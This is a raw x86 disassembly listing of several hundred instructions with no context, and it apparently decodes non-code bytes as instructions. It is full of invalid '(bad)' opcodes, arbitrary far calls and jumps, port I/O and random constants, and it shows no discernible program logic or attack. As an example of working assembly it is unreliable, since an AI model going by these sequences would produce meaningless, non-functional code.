  424797:	rol    DWORD PTR [esi+edi*1],1
  42479a:	mov    cl,0x5e
  42479c:	inc    ecx
  42479d:	scas   eax,DWORD PTR es:[edi]
  42479e:	pop    ds
  42479f:	rol    DWORD PTR ds:0xfd825454,cl
  4247a5:	mov    ebx,0xfdbc5cc7
  4247aa:	dec    eax
  4247ab:	add    esp,ecx
  4247ad:	dec    ebx
  4247ae:	mov    al,fs:0xf7f83a67
  4247b4:	call   0x940c:0x895f3dbb
  4247bb:	jo     0x42482d
  4247bd:	inc    ecx
  4247be:	cmp    al,0xa6
  4247c0:	loopne 0x424755
  4247c2:	jae    0x424770
  4247c4:	sbb    DWORD PTR [eax-0x2ef890],eax
  4247ca:	add    eax,0x5a4588fe
  4247cf:	mov    ds:0xda8deeff,al
  4247d4:	test   al,0x53
  4247d6:	das    
  4247d7:	stc    
  4247d8:	dec    ebp
  4247d9:	jle    0x4247c6
  4247db:	inc    esp
  4247dc:	mov    ebp,0xfa11578e
  4247e1:	xor    al,0x29
  4247e3:	mov    cl,0x17
  4247e5:	sbb    ch,BYTE PTR [edx]
  4247e7:	push   cs
  4247e8:	fcmovbe st,st(5)
  4247ea:	les    ebp,FWORD PTR [edx+0x5455d7ea]
  4247f0:	rol    BYTE PTR [edx],cl
  4247f2:	pop    ds
  4247f3:	push   esi
  4247f4:	iret   
  4247f5:	shr    DWORD PTR [eax+0x22],0x8e
  4247f9:	jns    0x4247e5
  4247fb:	xor    BYTE PTR [ebx-0x6b],ch
  4247fe:	mul    BYTE PTR es:0x266c9507
  424805:	in     eax,dx
  424806:	sub    BYTE PTR [esi+0x4af8ca56],cl
  42480c:	xor    cl,BYTE PTR [ecx-0x744f8a9]
  424812:	push   eax
  424813:	aaa    
  424814:	test   dl,al
  424816:	push   esi
  424817:	or     eax,0x1a369d8b
  42481c:	fstp   QWORD PTR [esi-0x589737d2]
  424822:	jb     0x4247bc
  424824:	es mov bl,0xa9
  424827:	mov    ah,0x4b
  424829:	mov    eax,0xb1c13b2a
  42482e:	test   DWORD PTR [eax-0x5b],edx
  424831:	pop    esi
  424832:	clc    
  424833:	mov    cs,ebp
  424835:	adc    eax,0xf83aed1c
  42483a:	or     dh,BYTE PTR [esi-0x16]
  42483d:	ja     0x424851
  42483f:	cld    
  424840:	and    dl,dh
  424842:	dec    edi
  424843:	mov    ch,0x91
  424845:	loop   0x42484d
  424847:	xchg   ebx,eax
  424848:	ret    
  424849:	or     edi,eax
  42484b:	adc    bh,bl
  42484d:	repnz push cs
  42484f:	mov    esi,0x4e883de4
  424854:	imul   eax,esi,0x4b
  424857:	fwait
  424858:	outs   dx,BYTE PTR ds:[esi]
  424859:	xor    dl,BYTE PTR [ebx-0x76bcf7d7]
  42485f:	jp     0x424840
  424861:	adc    eax,0xc35e6229
  424866:	cmp    al,0x5c
  424868:	adc    dh,BYTE PTR [edx+0xb]
  42486b:	in     al,dx
  42486c:	xor    al,0xb6
  42486e:	cdq    
  42486f:	add    dh,BYTE PTR ss:[ebx+0x4a892cb]
  424876:	mov    ds:0xbbe1c58a,al
  42487b:	stos   BYTE PTR es:[edi],al
  42487c:	add    al,0x75
  42487e:	fadd   QWORD PTR [esi+ecx*8+0x70]
  424882:	mov    edx,0x727d803c
  424887:	mov    eax,0xf02a7cd5
  42488c:	jecxz  0x42486e
  42488e:	dec    ebp
  42488f:	aad    0xc5
  424891:	mov    WORD PTR [ebx-0x78],fs
  424894:	shl    BYTE PTR [edi-0x7a],0x96
  424898:	jno    0x4248e7
  42489a:	xor    esi,DWORD PTR [esi+edx*2]
  42489d:	(bad)  
  42489e:	xchg   DWORD PTR cs:[esi],esp
  4248a1:	bound  esi,QWORD PTR [eax]
  4248a3:	sub    eax,0xf0fa8151
  4248a8:	push   ebp
  4248a9:	sbb    BYTE PTR [ecx],cl
  4248ab:	sbb    BYTE PTR [ebx],dl
  4248ad:	push   es
  4248ae:	and    BYTE PTR ds:0x1fc8de01,dh
  4248b4:	ficomp WORD PTR [esi-0x7133c62]
  4248ba:	add    al,0x4e
  4248bc:	xchg   ebx,eax
  4248bd:	add    DWORD PTR [eax+0x78f1005a],ebp
  4248c3:	adc    ah,BYTE PTR [ebp-0x7754a686]
  4248c9:	jae    0x424934
  4248cb:	sbb    edi,ebp
  4248cd:	dec    eax
  4248ce:	push   esp
  4248cf:	inc    edi
  4248d0:	std    
  4248d1:	dec    ebp
  4248d2:	test   al,0x16
  4248d4:	pop    esi
  4248d5:	stos   BYTE PTR es:[edi],al
  4248d6:	xor    DWORD PTR [ebx],ecx
  4248d8:	inc    edi
  4248d9:	xlat   BYTE PTR ds:[ebx]
  4248da:	or     eax,0x6d541047
  4248df:	mov    edi,0x29745656
  4248e4:	out    dx,al
  4248e5:	add    eax,DWORD PTR [ecx+0x1b]
  4248e8:	cmp    edx,ebp
  4248ea:	enter  0x736b,0x33
  4248ee:	and    al,0xfc
  4248f0:	cmp    ch,bh
  4248f2:	rcr    ecx,0x12
  4248f5:	sub    DWORD PTR [esi],esi
  4248f7:	push   ebp
  4248f8:	push   ebx
  4248f9:	adc    BYTE PTR [edx],cl
  4248fb:	mov    al,ds:0x4595de8f
  424900:	and    ebx,ebx
  424902:	cmp    ch,0x60
  424905:	add    edi,ebx
  424907:	pop    edx
  424908:	jae    0x42497f
  42490a:	jmp    0x42493d
  42490c:	imul   edx,DWORD PTR [edx+eiz*1-0x27f5edcb],0xeb2d2299
  424917:	adc    esi,ecx
  424919:	sahf   
  42491a:	pop    ebx
  42491b:	(bad)  
  42491c:	jl     0x424962
  42491e:	and    BYTE PTR [edi*4+0x60fb50bd],ah
  424925:	ss mov esi,0x958fc1cd
  42492b:	xchg   ecx,eax
  42492c:	imul   DWORD PTR [edi+0x22ed46e5]
  424932:	sbb    dl,BYTE PTR [esi+0x35]
  424935:	xor    BYTE PTR [esi+esi*8-0x15],dl
  424939:	and    edx,DWORD PTR [ebp-0x58592e63]
  42493f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424940:	sar    al,cl
  424942:	push   esp
  424943:	and    al,0xad
  424945:	pop    ebx
  424946:	fisubr DWORD PTR [ecx-0x6d55ef46]
  42494c:	mov    ah,0x4a
  42494e:	sbb    eax,0xb2cb2556
  424953:	mov    edx,0x2fcf198c
  424958:	adc    DWORD PTR [eax-0x282dd996],edx
  42495e:	in     eax,dx
  42495f:	jmp    0xd0ee2386
  424964:	loope  0x4249dd
  424966:	mov    ss,WORD PTR [eax-0x56516192]
  42496c:	into   
  42496d:	ret    0x8d41
  424970:	fld    TBYTE PTR [edi+0x49]
  424973:	mov    ebx,0xca6dc0f8
  424978:	mov    ch,0xde
  42497a:	inc    ebp
  42497b:	loopne 0x4249f5
  42497d:	pop    es
  42497e:	lahf   
  42497f:	cmp    eax,0x19d1dad5
  424984:	dec    edx
  424985:	or     al,0xe0
  424987:	adc    eax,0xe1ed46f8
  42498c:	mov    ebp,0x402f6dd
  424991:	lea    esi,[edi]
  424993:	mov    edi,0x6147a15f
  424998:	add    BYTE PTR [edi-0x31],ch
  42499b:	lds    esi,FWORD PTR [eax+0x5bfb8e42]
  4249a1:	jbe    0x4249b5
  4249a3:	dec    edi
  4249a4:	push   esi
  4249a5:	fwait
  4249a6:	cwde   
  4249a7:	mov    bh,0x7
  4249a9:	push   ecx
  4249aa:	pop    esi
  4249ab:	fwait
  4249ac:	aam    0x4f
  4249ae:	in     al,dx
  4249af:	je     0x424a0b
  4249b1:	push   edi
  4249b2:	cmc    
  4249b3:	push   ecx
  4249b4:	add    eax,0x5ce40b36
  4249b9:	cli    
  4249ba:	mov    bh,0x64
  4249bc:	push   ss
  4249bd:	mov    ebx,0x32bbfc49
  4249c2:	push   ecx
  4249c3:	jmp    0x9bb5:0x151d25ee
  4249ca:	dec    eax
  4249cb:	popa   
  4249cc:	sub    bl,BYTE PTR [ecx]
  4249ce:	xor    DWORD PTR [ebp+0x247dc156],0x1db597f0
  4249d8:	cld    
  4249d9:	or     ecx,DWORD PTR [edi]
  4249db:	test   DWORD PTR [edx],ecx
  4249dd:	cmp    BYTE PTR [ecx],0x59
  4249e0:	stos   BYTE PTR es:[edi],al
  4249e1:	jecxz  0x4249c9
  4249e3:	jbe    0x4249f0
  4249e5:	movaps XMMWORD PTR [edi],xmm7
  4249e8:	xor    DWORD PTR [edi],ecx
  4249ea:	leave  
  4249eb:	or     eax,0x7fd4e353
  4249f0:	inc    edx
  4249f1:	dec    eax
  4249f2:	push   ebx
  4249f3:	out    dx,eax
  4249f4:	popf   
  4249f5:	push   eax
  4249f6:	xor    eax,0x6ff1b9fd
  4249fb:	sub    ch,BYTE PTR [ebp-0x20]
  4249fe:	push   0x32
  424a00:	mov    bl,bh
  424a02:	in     eax,0xdd
  424a04:	push   edx
  424a05:	fs adc al,0xab
  424a08:	lock dec ebx
  424a0a:	sub    ch,dl
  424a0c:	loope  0x4249f5
  424a0e:	inc    esi
  424a0f:	mov    ebx,DWORD PTR [esi-0xef07921]
  424a15:	lds    esp,FWORD PTR [edx]
  424a17:	push   0xffffffea
  424a19:	inc    BYTE PTR [edx+0x0]
  424a1c:	ror    DWORD PTR es:[edx+0x628c501b],0xf2
  424a24:	iret   
  424a25:	xor    al,0xfa
  424a27:	leave  
  424a28:	outs   dx,DWORD PTR ds:[esi]
  424a29:	test   DWORD PTR [eax-0x597b727a],ebx
  424a2f:	jnp    0x424a02
  424a31:	mov    WORD PTR [edi],fs
  424a33:	or     BYTE PTR [ebx],bl
  424a35:	lahf   
  424a36:	or     eax,0xf70cd507
  424a3b:	pop    edx
  424a3c:	mov    WORD PTR [ecx+0x67],fs
  424a3f:	adc    BYTE PTR [ecx+0x1c],dl
  424a42:	ds mov dl,0x10
  424a45:	es and al,0xaa
  424a48:	mov    fs,WORD PTR [ecx+eax*4]
  424a4b:	mov    cl,ah
  424a4d:	dec    edi
  424a4e:	cwde   
  424a4f:	sbb    ah,0x43
  424a52:	ss pop esi
  424a54:	or     BYTE PTR [eax-0xa],bl
  424a57:	fmul   QWORD PTR [ecx+ecx*4-0x459f16e9]
  424a5e:	cmp    al,BYTE PTR [edi+0x144dc443]
  424a64:	and    al,0x9f
  424a66:	dec    ecx
  424a67:	mov    eax,0x4832c4b8
  424a6c:	mov    dl,0x98
  424a6e:	mov    dl,0x1
  424a70:	fsubr  QWORD PTR [ecx-0x8185926]
  424a76:	mov    ds:0x93febdc6,al
  424a7b:	xor    esp,DWORD PTR [edi-0x28bc5510]
  424a81:	arpl   WORD PTR [esi],si
  424a83:	fwait
  424a84:	shl    BYTE PTR [esi-0x47],0x88
  424a88:	bound  esp,QWORD PTR [ebx-0x14b91257]
  424a8e:	lods   eax,DWORD PTR ds:[esi]
  424a8f:	cmp    dl,BYTE PTR [edx-0x54a04836]
  424a95:	pusha  
  424a96:	mov    ch,0xd5
  424a98:	ret    0x864c
  424a9b:	mov    edx,0x918a3f73
  424aa0:	mov    cl,0x24
  424aa2:	into   
  424aa3:	scas   eax,DWORD PTR es:[edi]
  424aa4:	xchg   ebp,eax
  424aa5:	icebp  
  424aa6:	cli    
  424aa7:	int    0x2d
  424aa9:	cld    
  424aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424aab:	sbb    dh,BYTE PTR [ebp-0x34]
  424aae:	inc    ebp
  424aaf:	jp     0x424b15
  424ab1:	or     ch,BYTE PTR [ecx-0x55]
  424ab4:	mov    DWORD PTR [edx-0x27],esp
  424ab7:	rcr    DWORD PTR [esi+0x12],0x88
  424abb:	stos   BYTE PTR es:[edi],al
  424abc:	cmc    
  424abd:	cwde   
  424abe:	and    esp,DWORD PTR [edx-0x8]
  424ac1:	clc    
  424ac2:	stos   DWORD PTR es:[edi],eax
  424ac3:	push   edx
  424ac4:	sub    BYTE PTR [eax+0x2e],bl
  424ac7:	xor    cl,BYTE PTR [edi+0x14]
  424aca:	lock int3 
  424acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424acd:	stos   DWORD PTR es:[edi],eax
  424ace:	fwait
  424acf:	mov    bl,0x88
  424ad1:	inc    esp
  424ad2:	xchg   esp,eax
  424ad3:	clc    
  424ad4:	mov    BYTE PTR [ecx+0x4],ah
  424ad7:	and    BYTE PTR [esi+0x5907595e],al
  424add:	and    ecx,ebx
  424adf:	pop    ebx
  424ae0:	jg     0x424b33
  424ae2:	fld    QWORD PTR [ecx+eiz*1-0x1e184ef5]
  424ae9:	mov    ebx,0x53a2250b
  424aee:	in     al,dx
  424aef:	aaa    
  424af0:	stos   BYTE PTR es:[edi],al
  424af1:	adc    dh,cl
  424af3:	pmulhw mm0,QWORD PTR [edx-0x6d13a1c8]
  424afa:	or     DWORD PTR [esi+ebp*4],ecx
  424afd:	test   eax,0x6ce9f7ae
  424b02:	adc    cl,BYTE PTR [edi+0x39885246]
  424b08:	sub    eax,0xbac3478c
  424b0d:	xor    esi,edx
  424b0f:	sbb    BYTE PTR [ecx-0x5f],ch
  424b12:	inc    edi
  424b13:	jp     0x424abf
  424b15:	xchg   ecx,eax
  424b16:	add    ch,BYTE PTR ds:0xdca4dcd5
  424b1c:	rol    cl,1
  424b1e:	pop    edi
  424b1f:	sbb    eax,0x607941dd
  424b24:	hlt    
  424b25:	or     esi,DWORD PTR [ecx+0x7d]
  424b28:	call   0x5cdf:0x85129b5c
  424b2f:	and    al,0x8c
  424b31:	xor    eax,0x55188427
  424b36:	imul   edx,ebp,0x5783f10b
  424b3c:	push   esi
  424b3d:	mov    cl,0xab
  424b3f:	push   edx
  424b40:	lds    ecx,FWORD PTR [eax+0x3e]
  424b43:	mov    BYTE PTR [edi],al
  424b45:	push   ds
  424b46:	outs   dx,BYTE PTR ds:[esi]
  424b47:	outs   dx,BYTE PTR ds:[esi]
  424b48:	ja     0x424ad1
  424b4a:	push   ss
  424b4b:	cmp    eax,DWORD PTR [eax+0x30d6fc19]
  424b51:	into   
  424b52:	cld    
  424b53:	push   cs
  424b54:	shl    DWORD PTR [esi+0x7b],0xc
  424b58:	inc    eax
  424b59:	push   cs
  424b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b5b:	add    al,0x76
  424b5d:	cwde   
  424b5e:	push   es
  424b5f:	sbb    eax,0xc96f7381
  424b64:	(bad)  
  424b65:	jo     0x424b08
  424b67:	pop    ss
  424b68:	ret    0xf287
  424b6b:	xchg   ebx,eax
  424b6c:	js     0x424be2
  424b6e:	jge    0x424b85
  424b70:	test   eax,0xe2374f7e
  424b75:	jl     0x424b00
  424b77:	(bad)  
  424b78:	imul   edx,edx,0x59
  424b7b:	int3   
  424b7c:	and    al,0x62
  424b7e:	dec    eax
  424b7f:	hlt    
  424b80:	fidivr DWORD PTR [eax]
  424b82:	push   edi
  424b83:	out    dx,eax
  424b84:	push   0x2c74e5bf
  424b89:	lods   al,BYTE PTR ds:[esi]
  424b8a:	sub    ebp,ebx
  424b8c:	data16 cmp BYTE PTR [ebp+0x5c],0xde
  424b91:	sub    BYTE PTR [ebx],dl
  424b93:	div    ah
  424b95:	mov    ecx,0xa13869f9
  424b9a:	add    dh,bh
  424b9c:	inc    edi
  424b9d:	inc    esi
  424b9e:	add    eax,0x70111100
  424ba3:	add    esi,edi
  424ba5:	mov    esi,0xaa7a1aa5
  424baa:	xchg   esi,eax
  424bab:	(bad)  
  424bad:	jg     0x424b9b
  424baf:	cmp    dh,cl
  424bb1:	aaa    
  424bb2:	pop    edx
  424bb3:	cwde   
  424bb4:	out    0xf7,eax
  424bb6:	push   esp
  424bb7:	ja     0x424c15
  424bb9:	push   ebp
  424bba:	std    
  424bbb:	dec    ecx
  424bbc:	push   ebp
  424bbd:	leave  
  424bbe:	mov    ecx,0x9bc458a1
  424bc3:	dec    ebx
  424bc4:	pop    ebx
  424bc5:	sbb    al,BYTE PTR [edx]
  424bc7:	dec    ecx
  424bc8:	jmp    0x843d6371
  424bcd:	sub    ch,BYTE PTR [edx+0x2d300762]
  424bd3:	(bad)  
  424bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bd5:	in     al,0xf
  424bd7:	popa   
  424bd8:	daa    
  424bd9:	or     dh,BYTE PTR [eax]
  424bdb:	arpl   cx,bx
  424bdd:	dec    ebp
  424bde:	clc    
  424bdf:	outs   dx,BYTE PTR ds:[esi]
  424be0:	push   ds
  424be1:	jo     0x424c36
  424be3:	sub    al,dl
  424be5:	cmp    BYTE PTR [ebp*1+0x5a2133e3],ch
  424bec:	cmp    DWORD PTR [esi+ecx*4],edi
  424bef:	icebp  
  424bf0:	pop    esi
  424bf1:	sar    al,0xbb
  424bf4:	arpl   WORD PTR [eax],si
  424bf6:	push   es
  424bf7:	rol    DWORD PTR [eax],cl
  424bf9:	and    edi,edi
  424bfb:	test   BYTE PTR [ecx-0x677de168],dl
  424c01:	jno    0x424bb0
  424c03:	mov    eax,0x8c641cc1
  424c08:	jb     0x424c57
  424c0a:	xor    DWORD PTR [esi-0x76],ebp
  424c0d:	lea    eax,[ebx-0x68]
  424c10:	or     ecx,0xffffffec
  424c13:	(bad)  
  424c15:	lea    edx,[ebp-0xf33857e]
  424c1b:	sbb    DWORD PTR [bx+0x26a8],ecx
  424c20:	ret    
  424c21:	sahf   
  424c22:	mov    gs,edi
  424c24:	xchg   edi,eax
  424c25:	add    al,0x64
  424c27:	inc    dx
  424c29:	mov    bl,BYTE PTR [esi-0x74c21dc4]
  424c2f:	retf   0x82a8
  424c32:	mov    BYTE PTR [esi-0x52],0x4c
  424c36:	jecxz  0x424c35
  424c38:	aad    0x1c
  424c3a:	add    dl,BYTE PTR [esi+edi*8+0x1d7ee4df]
  424c41:	cdq    
  424c42:	fmul   DWORD PTR [edi-0x771c6ed4]
  424c48:	retf   0xa3b6
  424c4b:	retf   0x2098
  424c4e:	or     al,0x56
  424c50:	sbb    eax,0xdb5dca3
  424c55:	in     al,0xba
  424c57:	dec    ebp
  424c58:	mov    ah,0x33
  424c5a:	ss and dh,cl
  424c5d:	add    al,0xd6
  424c5f:	dec    eax
  424c60:	sub    al,0x5b
  424c62:	popf   
  424c63:	push   ss
  424c64:	bound  ebx,QWORD PTR [ebx]
  424c66:	and    eax,0xc0dab3bc
  424c6b:	scas   eax,DWORD PTR es:[edi]
  424c6c:	test   BYTE PTR [edi],0xd7
  424c6f:	pcmpgtb mm4,mm2
  424c72:	mov    edx,0x5048f412
  424c77:	cmc    
  424c78:	or     DWORD PTR [eax+ebp*8],0x22
  424c7c:	mov    ds:0x43faf97b,al
  424c81:	ja     0x424c2a
  424c83:	jne    0x424ca8
  424c85:	xchg   ebp,eax
  424c86:	rcl    ebx,1
  424c88:	adc    eax,0xc2dcb13c
  424c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c8e:	push   edi
  424c8f:	pop    edi
  424c90:	push   DWORD PTR [edx-0x21f5ff39]
  424c96:	cdq    
  424c97:	imul   ebx,DWORD PTR [ebx],0x3f0423eb
  424c9d:	sbb    al,0xee
  424c9f:	sbb    al,0xf4
  424ca1:	or     ch,bl
  424ca3:	inc    esp
  424ca4:	jne    0x424c68
  424ca6:	and    BYTE PTR [ebp-0x36576dfe],0x12
  424cad:	cmp    esp,DWORD PTR [eax]
  424caf:	inc    esi
  424cb0:	jae    0x424c7b
  424cb2:	es push esp
  424cb4:	jge    0x424cc0
  424cb6:	push   esp
  424cb7:	aas    
  424cb8:	inc    ebx
  424cb9:	push   0x2e
  424cbb:	cwde   
  424cbc:	loopne 0x424c45
  424cbe:	aas    
  424cbf:	pop    ss
  424cc0:	into   
  424cc1:	and    esp,DWORD PTR [edx+ebp*1-0x45e5a8a1]
  424cc8:	mov    ch,0xbd
  424cca:	sub    bl,BYTE PTR [edi+0x36]
  424ccd:	addr16 push ebx
  424ccf:	pusha  
  424cd0:	es jecxz 0x424d0d
  424cd3:	lds    edi,FWORD PTR ds:0xd6ca1aa3
  424cd9:	pop    edx
  424cda:	mov    edx,0xc91509a
  424cdf:	jno    0x424d15
  424ce1:	xchg   ecx,eax
  424ce2:	inc    esp
  424ce3:	xchg   ebp,eax
  424ce4:	cli    
  424ce5:	jge    0x424d25
  424ce7:	adc    ah,bl
  424ce9:	out    dx,eax
  424cea:	sub    al,0x6c
  424cec:	xchg   ecx,eax
  424ced:	es jbe 0x424d37
  424cf0:	inc    edx
  424cf1:	cmp    BYTE PTR [ebx-0x49],dl
  424cf4:	mov    ah,0x9d
  424cf6:	dec    ebp
  424cf7:	xor    eax,0x5126b9d9
  424cfc:	(bad)  
  424cfd:	sti    
  424cfe:	repnz or eax,0x2b1070cc
  424d04:	(bad)  
  424d05:	sbb    eax,0xd3d1ae7c
  424d0a:	jbe    0x424d0c
  424d0c:	xor    eax,0x270d294f
  424d11:	int    0x61
  424d13:	pop    ebx
  424d14:	lock add eax,0x356e8991
  424d1a:	add    edx,DWORD PTR [eax]
  424d1c:	or     BYTE PTR [esi+eax*2+0x0],ch
  424d20:	out    0x3d,al
  424d22:	loop   0x424d7b
  424d24:	inc    esi
  424d25:	(bad)  
  424d26:	fstp   QWORD PTR [eax]
  424d28:	jo     0x424d1d
  424d2a:	xlat   BYTE PTR ds:[ebx]
  424d2b:	push   ecx
  424d2c:	adc    bl,BYTE PTR [edi+0x647cf2e4]
  424d32:	je     0x424d3e
  424d34:	daa    
  424d35:	push   0x25
  424d37:	add    al,0x83
  424d39:	mov    dh,0x6e
  424d3b:	jecxz  0x424dba
  424d3d:	call   0xadc1:0xea8e7e70
  424d44:	arpl   WORD PTR [ecx+0x6c],di
  424d47:	aam    0x6b
  424d49:	pop    eax
  424d4a:	push   eax
  424d4b:	mov    ch,0xfc
  424d4d:	add    DWORD PTR [ebx-0x2903511d],0x63
  424d54:	test   BYTE PTR [ebp-0x19],al
  424d57:	imul   ebx,DWORD PTR ss:[eax],0x27
  424d5b:	mov    ah,0xd9
  424d5d:	cmp    eax,0xc464c59e
  424d62:	ret    0x89cb
  424d65:	push   ds
  424d66:	mov    esi,0x9c40543
  424d6b:	add    al,0x71
  424d6d:	shl    DWORD PTR [ecx-0x4f],1
  424d70:	aad    0xea
  424d72:	mov    ds:0xc2df27a2,eax
  424d77:	or     eax,0x992efe94
  424d7c:	(bad)  
  424d7d:	and    eax,0x22df8622
  424d82:	aaa    
  424d83:	sub    al,0x6d
  424d85:	lods   eax,DWORD PTR ds:[esi]
  424d86:	arpl   WORD PTR [esi+0x55ddd1d3],bp
  424d8c:	aad    0x58
  424d8e:	fwait
  424d8f:	push   ds
  424d90:	adc    edi,DWORD PTR [eax-0x68]
  424d93:	iret   
  424d94:	das    
  424d95:	jns    0x424d2a
  424d97:	push   ebp
  424d98:	or     al,0xa0
  424d9a:	push   cs
  424d9b:	mov    edi,0x95b6f61d
  424da0:	adc    edi,DWORD PTR [esi]
  424da2:	les    esi,FWORD PTR [edi]
  424da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424da5:	pop    ebp
  424da6:	rcr    BYTE PTR [eax+0x8],0x93
  424daa:	call   0x47215fc
  424daf:	sub    al,0x8b
  424db1:	retw   
  424db3:	(bad)  
  424db4:	adc    BYTE PTR [eax+ebx*8],dl
  424db7:	sub    bh,bl
  424db9:	pop    ss
  424dba:	mov    BYTE PTR ds:0x20a44ec5,bl
  424dc0:	inc    esp
  424dc1:	and    al,BYTE PTR [ebx+edi*1-0x64]
  424dc5:	outs   dx,BYTE PTR ds:[esi]
  424dc6:	sub    ebx,DWORD PTR [ecx+0x5a]
  424dc9:	push   ss
  424dca:	jbe    0x424de6
  424dcc:	or     esp,ebp
  424dce:	ror    BYTE PTR [ecx+0x4e],1
  424dd1:	sub    DWORD PTR [ecx-0x53],0x4916d537
  424dd8:	cli    
  424dd9:	adc    BYTE PTR [eax+0x10831667],bl
  424ddf:	xchg   esp,eax
  424de0:	pusha  
  424de1:	sbb    esi,DWORD PTR [ebx+0x6c]
  424de4:	ret    
  424de5:	addr16 pusha 
  424de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424de8:	ror    DWORD PTR [edi+0xe],0xba
  424dec:	or     BYTE PTR [ebx],al
  424dee:	inc    ecx
  424def:	mov    ax,ds:0x5cb7b949
  424df6:	pop    edi
  424df7:	(bad)  
  424df8:	sub    eax,0x9de63144
  424dfd:	sbb    esi,DWORD PTR [ecx+0x3]
  424e00:	sub    dl,ah
  424e02:	pop    eax
  424e03:	mov    esp,0x938f1e6e
  424e08:	and    ecx,edi
  424e0a:	push   esi
  424e0b:	das    
  424e0c:	jecxz  0x424de9
  424e0e:	(bad)  [ecx-0x4c]
  424e11:	jecxz  0x424e37
  424e13:	add    al,0x4b
  424e15:	push   ebp
  424e16:	pop    ebp
  424e17:	push   cs
  424e18:	pusha  
  424e19:	test   eax,0xcc864050
  424e1e:	cmp    eax,0xcd5472ec
  424e23:	xor    ah,BYTE PTR [esi]
  424e25:	mov    BYTE PTR [ebx+ebp*4],cl
  424e28:	stos   BYTE PTR es:[edi],al
  424e29:	loopne 0x424e76
  424e2b:	xor    al,0x85
  424e2d:	dec    ebx
  424e2e:	xchg   esp,eax
  424e2f:	js     0x424e38
  424e31:	mov    dl,0x36
  424e33:	mov    ss,WORD PTR [edx+ebp*1+0x38]
  424e37:	adc    eax,0x6bca21ec
  424e3c:	lods   al,BYTE PTR ds:[esi]
  424e3d:	idiv   DWORD PTR [ebx]
  424e3f:	mov    ch,al
  424e41:	sub    ebp,edi
  424e43:	add    dl,BYTE PTR [ebx+edx*1-0x45]
  424e47:	adc    al,0x2e
  424e49:	cmp    al,0xb9
  424e4b:	cmc    
  424e4c:	jbe    0x424e9d
  424e4e:	adc    ebx,edx
  424e50:	(bad)  
  424e51:	out    dx,eax
  424e52:	int    0x62
  424e54:	mov    ds:0x85e4c5d9,eax
  424e59:	or     bl,BYTE PTR [esi+0x7322d8ba]
  424e5f:	icebp  
  424e60:	push   ebp
  424e61:	add    BYTE PTR [ecx-0x47],ch
  424e64:	ins    DWORD PTR es:[edi],dx
  424e65:	inc    esi
  424e66:	enter  0x4199,0x60
  424e6a:	cmp    eax,0x6bbf3af8
  424e6f:	cld    
  424e70:	ins    DWORD PTR es:[edi],dx
  424e71:	dec    sp
  424e73:	dec    edx
  424e74:	data16 lods al,BYTE PTR ds:[esi]
  424e76:	mov    al,ds:0x52155103
  424e7b:	lock add edi,DWORD PTR [edx+0x7b407624]
  424e82:	push   cs
  424e83:	xchg   esp,eax
  424e84:	das    
  424e85:	pop    DWORD PTR [edx+ebx*4+0x53bee953]
  424e8c:	popa   
  424e8d:	mov    esp,0xcea89f93
  424e92:	leave  
  424e93:	dec    ebx
  424e94:	test   DWORD PTR [esi],edx
  424e96:	stos   BYTE PTR es:[edi],al
  424e97:	stos   BYTE PTR es:[edi],al
  424e98:	loope  0x424ea7
  424e9a:	test   DWORD PTR [esi+0x27],esp
  424e9d:	cmp    eax,DWORD PTR [esi+0x251078b9]
  424ea3:	ret    0x11fe
  424ea6:	stos   BYTE PTR es:[edi],al
  424ea7:	add    al,0x4a
  424ea9:	fist   WORD PTR [edi+0x5]
  424eac:	inc    edi
  424ead:	xlat   BYTE PTR ds:[ebx]
  424eae:	cmp    bh,dh
  424eb0:	jno    0x424ee4
  424eb2:	or     esi,DWORD PTR [ebp+0x4488916]
  424eb8:	and    DWORD PTR [edx],ecx
  424eba:	dec    edx
  424ebb:	aad    0x58
  424ebd:	daa    
  424ebe:	pop    ds
  424ebf:	mov    dh,0xb0
  424ec1:	(bad)  
  424ec2:	push   esi
  424ec3:	test   DWORD PTR [ebp+0x5b],ecx
  424ec6:	jp     0x424ee4
  424ec8:	aaa    
  424ec9:	out    0xc3,eax
  424ecb:	clc    
  424ecc:	loopne 0x424f03
  424ece:	gs int3 
  424ed0:	dec    edi
  424ed1:	cmc    
  424ed2:	sar    ecx,1
  424ed4:	jb     0x424eed
  424ed6:	jg     0x424e8f
  424ed8:	out    0x6e,al
  424eda:	sbb    edi,DWORD PTR [esi]
  424edc:	lds    ebp,FWORD PTR [esi]
  424ede:	ss sbb al,0xff
  424ee1:	bound  esp,QWORD PTR [edx]
  424ee3:	(bad)  [ebp+0x4]
  424ee6:	pusha  
  424ee7:	adc    al,BYTE PTR [eax+0x9351d40]
  424eed:	gs std 
  424eef:	lahf   
  424ef0:	xor    al,0x18
  424ef2:	rcr    BYTE PTR [ebp+0x24],0xf2
  424ef6:	adc    edi,esp
  424ef8:	aad    0xd3
  424efa:	cdq    
  424efb:	jno    0x424ef9
  424efd:	add    esp,DWORD PTR [ecx-0x8]
  424f00:	push   esp
  424f01:	xor    al,0x4a
  424f03:	cwde   
  424f04:	shl    DWORD PTR [ebx],cl
  424f06:	dec    esp
  424f07:	out    dx,eax
  424f08:	jb     0x424eda
  424f0a:	push   ebp
  424f0b:	add    al,0xc2
  424f0d:	popa   
  424f0e:	ins    DWORD PTR es:[edi],dx
  424f0f:	mov    eax,ds:0xba03048c
  424f14:	mov    ecx,0x59d54646
  424f19:	out    0x44,eax
  424f1b:	ret    0x2e84
  424f1e:	cmp    eax,0x68d3e72
  424f23:	test   al,0xf7
  424f25:	stos   DWORD PTR es:[edi],eax
  424f26:	out    dx,eax
  424f27:	test   al,0xc6
  424f29:	sbb    ebx,DWORD PTR [ecx+0x4e]
  424f2c:	in     al,dx
  424f2d:	leave  
  424f2e:	dec    edx
  424f2f:	adc    ebp,DWORD PTR [edi]
  424f31:	pop    ds
  424f32:	dec    ebp
  424f33:	mov    ds:0xf0f73847,eax
  424f38:	push   0xd
  424f3a:	repz jmp 0xd532d44
  424f40:	loopne 0x424edb
  424f42:	bound  ebx,QWORD PTR [ecx]
  424f44:	scas   eax,DWORD PTR es:[edi]
  424f45:	test   al,0xd7
  424f47:	jno    0x424f91
